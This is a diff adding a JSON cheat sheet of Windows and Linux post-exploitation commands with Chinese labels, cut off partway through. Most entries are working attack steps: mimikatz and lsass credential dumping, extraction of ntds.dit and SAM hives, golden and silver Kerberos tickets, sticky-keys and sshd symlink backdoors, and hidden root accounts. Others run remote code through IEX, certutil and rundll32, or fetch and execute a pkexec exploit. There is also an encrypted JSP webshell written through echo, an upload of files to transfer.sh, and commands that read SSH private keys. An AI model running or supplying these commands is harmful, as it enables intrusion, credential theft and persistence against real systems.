@@ -1,0 +1,515 @@
+[
+  {
+    "name": "Win-凭证获取",
+    "command": "mimikatz.exe \"log hash.txt\" \"privilege::debug\" \"sekurlsa::logonPasswords\" \"exit\"\nmimikatz.exe \"log hash.txt\" \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\"\n\n🚀 利用具有微软签名的DumpMinitool.exe工具导出内存\n# --file 保存的文件名\n# --processId lsass.exe 进程号\nDumpMinitool.exe --file dump.txt --processId 948 --dumpType Full\n\n🚀获取系统保存的RDP密码\n# 查询远程连接记录\nreg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /s\n# 解密出明文RDP连接密码, mimikatz执行如下命令:\nprivilege::debug\ndpapi::cred /in:{凭证文件}\nsekurlsa::dpapi\ndpapi::cred /in:{凭证文件} /masterkey:{MasterKey}\nexit\n\n🚀获取系统保存的VPN密码\nmimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::secrets\" \"exit\"\n\n🚀获取系统连接的WIFI密码\nfor /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear\n\n🚀卷影拷贝获取域控凭证, 此方法支持windows server 2003、2008、2012\n# 第一步：创建快照 产生的快照GUID为：{850bc5ab-7620-48fa-bd1f-c23c8150a3f0}\nntdsutil.exe snapshot \"activate instance ntds\" create quit quit\n# 第二步：加载快照 快照位置：C:\\$SNAP_202009222211_VOLUMEC$\\\nntdsutil.exe snapshot \"mount {850bc5ab-7620-48fa-bd1f-c23c8150a3f0}\" quit quit\n# 第三步：复制快照中的ntds.dit文件\ncopy 'C:\\$SNAP_202009222211_VOLUMEC$\\Windows\\NTDS\\ntds.dit' C:\\ntds.dit\n# 第四步：删除快照\nntdsutil.exe snapshot \"List All\" quit quit\nntdsutil.exe snapshot \"umount {850bc5ab-7620-48fa-bd1f-c23c8150a3f0}\" \"delete {850bc5ab-7620-48fa-bd1f-c23c8150a3f0}\" quit quit\nntdsutil.exe snapshot \"List All\" quit quit\n\n🚀利用注册表离线导出Hash\nreg save HKLM\\SYSTEM system.hiv\nreg save HKLM\\SAM sam.hiv\nreg save HKLM\\security security.hiv\n\n🚀使用mimikatz解密Hash\nmimikatz.exe \"log hash.txt\" \"lsadump::sam /system:system.hiv /sam:sam.hiv /security security.hiv\" exit\n\n🚀利用procdump导出内存文件\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp\n# 使用mimikatz抓取密码\nmimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"log hash.txt\" \"sekurlsa::logonPasswords full\" \"exit\"\n\n🚀离线获取系统保存的RDP密码\n# 查询远程连接记录\nreg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /s\n# 上传procdump获取内存文件, procdump执行如下命令:\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp\n# 解密出明文RDP连接密码, mimikatz执行如下命令:\nprivilege::debug\ndpapi::cred /in:{凭证文件}\nsekurlsa::minidump lsass.dmp\nsekurlsa::dpapi\ndpapi::cred /in:{凭证文件} /masterkey:{MasterKey}\nexit\n\n🚀利用PowerShell导出内存\npowershell -c \"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump {pid} {output} full\"\n# 获取保存到注册表中的密码\nREG query HKCU  /v \"pwd\" /s\"\n\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-权限维持",
+    "command": "粘滞键后门\npushd C:\\windows\\system32\nmove sethc.exe sethc.exe.bak\ncopy cmd.exe sethc.exe\n\n 🚀 克隆账号\n# 将一个账号当前的权限以及账号相关信息克隆到另外一个新账户中, 如果被克隆账号被禁用, 则无法克隆\npowershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Create-Clone.ps1'); Create-Clone -u support -p P@ssw0rd\n\n🚀 伪造黄金票据(伪造TGT)\n# 伪造条件：需要伪造的域管理员用户名、完整的域名、域SID、krbtgt的NTLM Hash或AES-256值\n# 注意事项：伪造用户可以是任意用户（TGT的加密是由krbtgt完成的，只要TGT被krbtgt账户密码正确加密，那么任意KDC使用krbtgt解密TGT中的信息也是可信的）\n# 获取管理员账号\nnet group \"domain admins\" /domain\n# 获取域名\nipconfig /all\n# 获取域SID\nwmic useraccount get name,sid //获取域内所有用户sid\nwhomai /user //获取当前用户sid\n# 导出krbtgt的ntml hash (使用mimikatz工具的dcsysc功能远程转储活动目录的ntds.dit并导出krbtgt账号信息)\nminikatz.exe \"lsadump::dcsync /domain:test.com /user:krbtgt /csv\" exit\n# 清空票据 mimikatz中输入如下命令\nkerberos::purge 或者 klist purge\n# 生成票据\nkerberos::golden /admin:administrator /domain:test.com /sid:S-1-5-21-593020204-2933201490-533286667 /krbtgt:8894a0f0182bff68e84bd7ba767ac8ed /ticket:golden.kiribi\n# 传递票据并注入(如果上一步用的/ptt参数就跳过这一步)\nKerberos::ptt golden.kiribi\n# 查看当前会话中的票据\nKerberos::tgt\n# 验证权限\ndir \\\\dc\\c$\n\n🚀 伪造白银票据(伪造TGS)\n# 伪造条件：域名、域SID、需要伪造的用户名、目标服务器的FQDN(Fully Qualified Domain Name) //全限定域名：同时带有主机名和域名的名称、可利用的服务、服务账号的NTML Hash\n# 注意事项：票据20分钟内有效，过期之后可以再次导入、银票是伪造的TGS，所以没有与域控制器通信、白银票据仅限于特定服务器上的任何服务、产生任何事件日志都在目标服务器上\n# 获取域名\nipconfig /all\n# 获取域SID\nwmic useraccount get name,sid //获取域内所有用户sid\nwhomai /user //获取当前用户sid\n# 获取服务账号的NTML Hash\nMimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" exit // 需要管理员权限\n# 清空票据 mimikatz中输入如下命令\nkerberos::purge\n# 生成票据\nmimikatz \"kerberos::golden /user:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt\" exit\n白银票据需要的参数:\n/target: 目标服务器的FQDN：(Fully Qualified Domain Name)全限定域名：同时带有主机名和域名的名称。（通过符号\".\"）\n/service: 运行在目标服务器上的kerberos服务，该服务主体名称类型如cifs，http，mssql等\n/rc4: 服务的NTLM散列（计算机帐户或用户帐户）\n# 查看当前会话中的票据\nKerberos::tgt\n# 验证权限\ndir \\\\dc\\c$\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-横向移动",
+    "command": "# 开启UAC后, 只有本地管理员组里的账户能pth。域Domain admin默认在本地管理员组\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\n\n🚀445端口SMB哈希传递\n# 使用impacket套件的psexec.exe工具：\n# 需要开放445端口, 此方法已被杀软列入黑名单\n# 需要远程系统开启admin$共享（默认是开启的）\n# 在使用PsExec执行命令时，会在目标系统中创建一个psexec服务。命令执行后，psexec服务将被自动删除。但创建或删除服务时会产生大量的日志\n# -accepteula：第一次运行PsExec会弹出确认框，使用该参数就不会弹出确认框\n# -s：以system权限运行远程进程，获得一个system权限的交互式shell。如果不使用该参数，会获得一个administrator权限的shell。\npsexec.exe /accepteula /s \\\\127.0.0.1 -u cloud/administrator -p P@ssw0rd -s cmd\n\n🚀使用impacket套件的mmcexec工具：\nmmcexec.exe -hashes e10adc3949ba59abbe56e057f20f883e cloud/administrator@127.0.0.1\n\n🚀使用impacket套件的smbclient工具：\nsmbclient.exe cloud/administrator:P@ssw0rd@127.0.0.1\nsmbclient.exe -hashes e10adc3949ba59abbe56e057f20f883e cloud/administrator@127.0.0.1\n\n🚀135端口WMI哈希传递\n# 使用impacket套件的wmiexec工具：\n# 在使用wmiexec进行横向移动时，Windows操作系统默认不会产生日志，此方法比PsExec隐蔽性要更好一些\nwmiexec.exe cloud/administrator:P@ssw0rd@127.0.0.1\nwmiexec.exe -hashes :e10adc3949ba59abbe56e057f20f883e cloud/administrator@127.0.0.1\n\n🚀查看远程计算机进程\ntasklist /S 192.168.31.17 /U domain\\administrator /P /V\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-获取操作系统信息",
+    "command": "查看系统版本和补丁信息: systeminfo\n识别操作系统名称及版本（英文）: systeminfo | findstr /B /C:\"OS Name\" /c:\"OS Version\"\n识别操作系统名称及版本（中文）: systeminfo | findstr /B /C:\"OS 名称\" /C:\"OS 版本\"\n识别系统体系结构: echo %PROCESSOR_ARCHITECTURE% AMD64",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-获取用户信息",
+    "command": "查看当前用户: whoami\n查看计算机用户列表: net user\n查看计算机用户组列表: net localgroup\n查看当前登录用户: query user\n查看当前用户保存的凭证: cmdkey /list\n查看当前用户保存的票据凭证: klist",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-获取网络信息",
+    "command": "查看路由信息 : route print\n查看arp : arp -A\n查看ip地址和dns信息: ipconfig /all\n查看防火墙规则: netsh firewall show config\n查看当前防火墙状态: netsh firewall show state\n查看系统开放端口: netstat -ano\n查看当前用户wifi配置文件：netsh wlan show profiles\n查看当前连接的wifi：netsh wlan show interface\n查看本机WiFi配置和密码:netsh wlan show profile \"ssid\" key=clear\n枚举所有连接过的wifi:for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear\n连接他配置文件的其它wifi：netsh wlan connect name=ssid",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-获取应用程序及服务信息",
+    "command": "查看计划任务: schtasks /query /fo LIST /v\n查看安装驱动: driverquery\n查看安装程序和版本信息: wmic product list brief\n查看服务: wmic service list brief\n查看进程: wmic process list brief\n根据进程查找进程文件: wmic process where name=\"xxxx.exe\" get processid,executablepath,name\nwmic process where name=\"chrome.exe\" list full\n查看启动程序信息: wmic startup list brief\n查看3389端口: for /f \"tokens=2\" %i in ('tasklist /FI \"SERVICES eq TermService\" /NH') do netstat -ano | findstr %i | findstr LISTENING\nWin设置终端代理: set http_proxy=http://127.0.0.1:7890 \u0026 set https_proxy=http://127.0.0.1:7890\n查看.msi程序的执行权限: reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v\n AlwaysInstallElevated\n查看是否设置setuid、setgid: reg HKEY_Local_Machine\\System\\CurrentControlSet\\Services\\NfsSvr\\Parameters\\SafeSetUidGidBits\n查看安装补丁和时间信息: wmic qfe get Caption,Description,HotFixID,InstalledOn\n查看特定漏洞补丁信息: wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:\"KBxxxxxxxx\"\n查看系统进程: tasklist /svc\n列出详细进程: tasklist /V /FO CSV",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-获取敏感数据和目录",
+    "command": "搜索D盘磁盘名字为logo.jpg的文件: cd /d D:\\ \u0026\u0026 dir /b /s logo.jpg\n搜素C盘文件夹下后缀conf内容有password: findstr /s /i /n /d:C:\\ \"password\" *.conf\n查找密码文件或其他敏感文件: dir /b/s password.txt dir /b/s .doc dir /b/s .ppt dir /b/s .xls dir /b/s .docx dir /b/s .xlsx dir /b/s config.* findstr /si password .xml .ini .txt findstr /si\n login .xml .ini .txt\n查看无人值守安装文件，文件位置如下: C:\\sysprep.inf C:\\sysprep\\sysprep.xml C:\\Windows\\Panther\\Unattend\\Unattended.xml C:\\Windows\\Panther\\Unattended.xml",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-添加用户",
+    "command": "添加用户并设置密码: net user mstlab tools /add\n将用户加入管理组: net localgroup administrators mstlab /add\n将用户加入桌面组: net localgroup \"Remote Desktop Users\" tools /add\n激活guest用户: net user guest /active:yes\n更改guest用户的密码: net user guest 123456\n将guest用户加入管理组: net localgroup administrators guest /add",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-注册表相关",
+    "command": "查看3389端口: REG query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber\n开启远程桌面: REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f\n\nwmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1\n\n注册表抓取明文: REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\nrdp连接默认的10个记录: reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\"\nrdp连接默认的所有记录: reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /s\n查找软件安装目录: reg query HKLM /f foxmail /t REG_SZ /s\n\nLocalAccountTokenFilterPolicy-启用任何管理员用户横向：reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\n\nreg导出注册表hash:reg save hklm\\sam c:\\programdata\\sam.hive \u0026\u0026 reg save hklm\\system c:\\programdata\\system.hive\n\nhash登录利用“Restricted Admin Mode“特性:新建DWORD键值DisableRestrictedAdmin，值为0，代表开启;值为1，代表关闭。\nREG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f\n查看是否开启DisableRestrictedAdmin REG_DWORD 0x0 存在就是开启：REG query \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" | findstr \"DisableRestrictedAdmin\"\n然后如果hash正确就可以登录目标主机：mstsc.exe /restrictedadmin\n\n取消仅允许运行使用网络识别身份验证的远程桌面的计算机连接(NLA):REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /f /d 0\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-mimikatz查看当前密码",
+    "command": "mimikatz查看当前密码: mimikatz \"log\" \"privilege:debug\" \"sekurlsa:logonpasswords\" \"exit\"\nmimikatz抓取domain密码: mimikatz \"lsadump::dcsync /domain:test.com /all /csv\" \"exit\"\nreg导出注册表hash: reg save hklm\\sam c:\\programdata\\sam.hive \u0026\u0026 reg save hklm\\system c:\\programdata\\system.hive\nmimikatz读取注册表导出的hash信息: mimikatz \"log\" \"lsadump::sam /sam:sam.hive /system:system.hive\" \"exit\"\nimpacket包的secretsdump: secretsdump.exe -sam sam.hive -system system.hive LOCAL\nnmap扫描永恒之蓝漏洞: nmap -p445 --script smb-vuln-ms17-010 127.0.0.1\nmeterpreter把目标的3389端口转发到vps的6666端口: portfwd add -l 6666 -p 3389 -r 127.0.0.1\nattrib创建隐藏文件: attrib +s +h +r *.exe\n.net静默安装: dotNetFx40_Full_x86_x64.exe /q /norestart /ChainingPackage FullX64Bootstrapper\nlcx端口转发: 本地监听: lcx.exe -listen 110 34567目标执行: lcx.exe -slave vpsip 110 127.0.0.1 3389\n扫描web.txt文件的网站标题: 本地监听: whatweb -i web.txt -p Title whatweb\nWin终端设置代理: 本地监听: set http_proxy=socks5://127.0.0.1:1080 \u0026\u0026 set https_proxy=socks5://127.0.0.1:1080\nxfreerdp hash连接rdp: xfreerdp /u:administrator /pth:ccef208c6485269c20db2cad21734fe7 /v:10.20.24.100 /cert-ignore //server 2012\nrunas运行其它账户权限的程序: runas /user:hostname\\\\username /sa \"cmd.exe\"",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-系统下载文件",
+    "command": "certutil下载文件: certutil -urlcache -split -f http://192.168.5.21:888/nc.txt c:\\nc.txt\ncertutil删除记录: certutil -urlcache -split -f http://192.168.1.115/robots.txt delete\nbitsadmin下载文件: bitsadmin /rawreturn /transfer getfile http://download.sysinternals.com/files/PSTools.zip c:\\Pstools.zip\npowershell下载文件:powershell -nop -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://127.0.0.1/nc.txt','nc.exe')\nmsedge下载并执行:cmd /c start /min msedge.exe http://127.0.0.1/test.zip \u0026\u0026 timeout 5 \u0026\u0026 taskkill /f /t /im msedge.exe \u0026\u0026 C:/Users/%UserName%/Downloads/test.zip\nrundll32下载文件：rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.3.150/chfs/shared/1Z3.exe\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-Wmic命令",
+    "command": "wmic远程连接机器: wmic /node:\"192.168.1.20\" /user:\"domain\\administrator\" /password:\"123456\"\n查看系统安装软件: wmic product get name,version\n查看系统版本: wmic OS get Caption,CSDVersion,OSArchitecture,Version\n根据Pid查找进程路径: wmic process get name,executablepath,processid|findstr pid\n查看磁盘信息: Wmic logicaldisk\n查看组、hostname等信息: wmic computersystem get Name, Domain, Manufacturer, Model, Username, Roles/format:list\n查看当前系统是否是VMWARE: wmic bios list full | find /i \"vmware\"\n查看当前系统是否有屏保及延迟: wmic desktop get screensaversecure,screensavertimeout\nwmic远程执行命令：wmic /node:192.168.3.200 /user:Administrator /password:Password@ process call create \"cmd.exe /c whoami \u003ec:\\whoami.txt\"\n\nwmic查看用户账户信息列表：\nwmic useraccount list brief\nwmic useraccount list\n\nwmic查看进程命令：\nwmic process get Caption,executablepath,ProcessId\nwmic process get Caption,executablepath,Commandline,ProcessId\nwmic /namespace:\\\\root\\cimv2 path win32_product get name,version\n\nwmic获取进程命令行：\nwmic process where caption=\"Chrome.exe\" get caption,commandline /value\nwmic process get commandline\n\nwmic查看程序绝对路径：\nwmic process where name=\"cmd.exe\" get processid,executablepath,name\n\nwmic查看系统进程：\nwmic process list brief\n\nwmic查看本机已打补丁：\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\nwmic查看本机杀软信息：\nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List\nWMIC /namespace:\\\\root\\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe\n\nwmic开启3389：\nwmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-Mssql环境",
+    "command": "mssql开启xp_cmdshell: EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;\nmssql输出文件: exec master..xp_cmdshell '\u003e\u003ec:\\windows\\temp\\info.txt set /p=\"base64_encode\" \u003cnull'; //代替echo输出 \n查看c盘下web.config文件: findstr /c:\"User Id=\" /c:\"Password=\" /si web.config \u003e\u003e tmps.logs \u003cnul';\n常规工作组内网环境下的mssql实例: PowerShell -Command \"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()\"",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-压缩解压",
+    "command": "# 7Z压缩文件\n7z.exe a OutputFile InputFile\n# 7Z解压文件\n7z.exe x InputFile OutputFile\n# RAR压缩文件\nrar.exe a OutputFile InputFile\n# RAR解压文件\nrar.exe x InputFile OutputFile\n\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-查找文件",
+    "command": "dir c:\\\\ /s /b | find \"win.ini\"\ndir c:\\\\ /s /b | find \"navicat.exe\"\ndir c:\\\\ /s /b | find \"finalshell.exe\"\ncd /d C:\\ \u0026\u0026 dir /b /s password.txt\nwhere /R C:\\ password.txt\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-写文件",
+    "command": "echo ^\u003c%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%^\u003e \u003e\u003e C:/x/x.jsp\n\necho ^\u003c%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%^\u003e \u003e\u003e C:/x/x.jsp\n\necho ^\u003c%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%^\u003e \u003e\u003e C:/x/x.jsp\n\n文件上传：curl -k --upload-file win.exe https://transfer.sh --progress-bar",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-显示曾连接的无线密码",
+    "command": "netsh wlan show profiles\nfor /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-常用系统变量",
+    "command": "查看当前用户目录%HOMEPATH\n查看当前目录%CD%\n列出用户共享主目录的网络路径%HOMESHARE%\n列出有效的当前登录会话的域名控制器名\n列出了可执行文件的搜索路径%Path%\n列出了处理器的芯片架构%PROCESSOR_ARCHITECTURE%\n列出了Program Files文件夹的路径%ProgramFiles%\n列出了当前登录的用户可用应用程序的默认临时目录%TEMP% and %TMP%\n列出了当前登录的用户可用应用程序的默认临时目录%TEMP% and %TMP%\n列出了包含用户帐号的域的名字%USERDOMAIN%\n列出操作系统目录的位置%WINDIR%\n返回“所有用户”配置文件的位置%ALLUSERSPROFILE%\n返回处理器数目%NUMBER_OF_PROCESSORS%\npowershell地址%PSModulePath%",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-网络Ping探测",
+    "command": "for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i \"ttl\"\nfor /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i \"ttl\"\u003e\u003e\"c:\\\\a.txt\"\nfor /l %i in (1,1,255) do @ping 192.168.%i.1 -w 1 -n 1 | find /i \"ttl\"",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-探测是否出网",
+    "command": "certutil -urlcache -split -f http://test.abc.net\npowershell Invoke-WebRequest \"http://test.abc.net/\"",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-Win2008开启3389",
+    "command": "wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS != \"\") call setallowtsconnections 1\nwmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-查看历史命令",
+    "command": "type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\ntype %appdata%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-计算文件hash",
+    "command": "certutil.exe -hashfile 1.txt",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-强制停止进程",
+    "command": "停止指定pid进程 taskkill /f /pid 3352\n停止指定exe taskkill /f /im explor.exe",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Linux-权限维持",
+    "command": "\n    创建Root权限账户\nuseradd -p `openssl passwd -1 -salt 'support' Passw0rd` -o -u 0 -g root -G root -s /bin/bash -d /home/support\n\n🚀创建普通权限账户\nuseradd -p `openssl passwd -1 -salt 'support' Passw0rd` support\n\n\n🚀创建Root权限账户\nuseradd -p `openssl passwd -1 -salt 'support' Passw0rd` -o -u 0 -g root -G root -s /bin/bash -d /home/support\n\n🚀创建普通权限账户\nuseradd -p `openssl passwd -1 -salt 'support' Passw0rd` support\n\n\n🚀软链接后门\n# 后门植入\nservice iptables stop\nln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=20020\n# 后门连接 输入任意密码，成功登录\nssh root@IP -p 20020 ",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-权限提升",
+    "command": "\nSUID提权\nfind / -perm -u=s -type f 2\u003e /dev/null\nfind / -user root -perm -4000 -print 2\u003e/dev/null\nfind / -user root -perm -4000 -exec ls -ldb {} \\;\n\nSUID提权\n具有提权功能的Linux可执行文件有:nmap vim find bash more less nano cp\n\n🚀PKEXEC提权(CVE-2021-4034)\nwget --no-check-certificate https://github.com/dzonerzy/poc-cve-2021-4034/releases/download/v0.2/exploit -O /tmp/.ICE-unix/run 2\u003e\u00261 \u003e /dev/null\nchmod +x /tmp/.ICE-unix/run\n/tmp/.ICE-unix/run\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查看操作系统版本",
+    "command": "cat /etc/issue //查看系统发行版本信息\n  cat /etc/*-release\ncat /etc/lsb-release //Debian\ncat /etc/redhat-release //Redhat\ncat /etc/os-release\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查看内核版本、是否为64位",
+    "command": "cat /proc/version\nuname -a // 查看内核、操作系统、CPU信息\nuname -mrs\nrpm -q kernel\ndmesg | grep Linux\nls /boot | grep wmlinuz-",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查看环境变量",
+    "command": "cat /etc/profile\ncat /etc/bashrc\ncat ~/.bash_profile\ncat ~/.bashrc\ncat ~/.bash_logout\nenv\nset\n查看是否有打印机: lpstat -a",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-获取应用程序及服务信息",
+    "command": "查看正在运行的程序及对应的用户权限:\nps aux\nps -ef\ntop\ncat /etc/services\n查看以root权限运行的进程:\nps aux | grep root\nps -ef | grep root\n查看安装的应用:\nls -alh /usr/bin/\nls -alh /sbin/\ndpkg -l\nrpm -qa\nls -alh /var/cache/apt/archives\nls -alh /var/cache/yum/\n\n查找进程相关文件：\nlsof -p pid\t\t/root权限下执行\npwdx\t\t\t获取该pid的进程启动的时候的目录，并不一定是恶意文件所在的路径，只是启动我恶意文件的路径\n\nsystemctl status pid 获取这个进程的status信息\ncat /proc/pid/maps\nls -al /proc/pid/exe\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-获取服务及配置文件信息",
+    "command": "cat /etc/syslog.conf\ncat /etc/chttp.conf\ncat /etc/lighttpd.conf\ncat /etc/cups/cupsd.conf\ncat /etc/inetd.conf\ncat /etc/apache2/apache2.conf\ncat /etc/my.conf\ncat /etc/httpd/conf/httpd.conf\nls -aRI /etc/ | awk '$1 ~ /^.*r.*/'",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-获取计划任务信息",
+    "command": "crontab -l\nls -alh /var/spool/cron\nls -al /etc/ | grep cron\nls -al /etc/cron*\ncat /etc/cron*\ncat /etc/at.allow\ncat /etc/at.deny\ncat /etc/cron.allow\ncat /etc/cron.deny\ncat /etc/crontab\ncat /etc/anacrontab\ncat /var/spool/cron/crontabs/root",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-获取用户信息",
+    "command": "id\nwho\nw\nlast\ncat /etc/passwd\ncat /etc/group\ncat /etc/shadow\ngrep -v -E \"^#\"/etc/passwd | awk -F: '$3 == 0 {print $1}'\nawk -F:'($3 == \"0\") {print}' /etc/passwd\ncat /etc/sudoers\nsudo -l\nls -ahlR /root/",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查找配置文件中的密码",
+    "command": "cat /var/apache2/config.inc\ncat /var/lib/mysql/mysql/user.MYD\ncat /root/anaconda-ks.cfg",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查看其他用户的操作记录",
+    "command": "cat ~/.bash_history\ncat ~/.nano_history\ncat ~/.atftp_history\ncat ~/.mysql_history\ncat ~/.php_history\n\n查看所有/bin/bash登录的历史命令记录：\ncat `cat /etc/passwd |grep /bin/bash | awk -F \":\" '{print $6}' | sed 's/$/\u0026\\/.bash_history/g'`\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查看ssh私钥",
+    "command": "cat ~/.ssh/authorized_keys\ncat ~/.ssh/identity.pub\ncat ~/.ssh/identity\ncat ~/.ssh/id_rsa.pub\ncat ~/.ssh/id_rsa\ncat ~/.ssh/id_dsa.pub\ncat ~/.ssh/id_dsa\ncat /etc/ssh/ssh_config\ncat /etc/ssh/sshd_config\ncat /etc/ssh/ssh_host_dsa_key.pub\ncat /etc/ssh/ssh_host_dsa_key\ncat /etc/ssh/ssh_host_rsa_key.pub\ncat /etc/ssh/ssh_host_rsa_key\ncat /etc/ssh/ssh_host_key.pub\ncat /etc/ssh/ssh_host_key",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-获取存储的明文用户名、密码",
+    "command": "grep -i user [filename]\ngrep -i pass [filename]\ngrep -C 5 \"password\" [filename]\nfind . -name \"*.php\" -print0 | xargs -0 grep -i -n \"var $password\"",
+    "meta": [
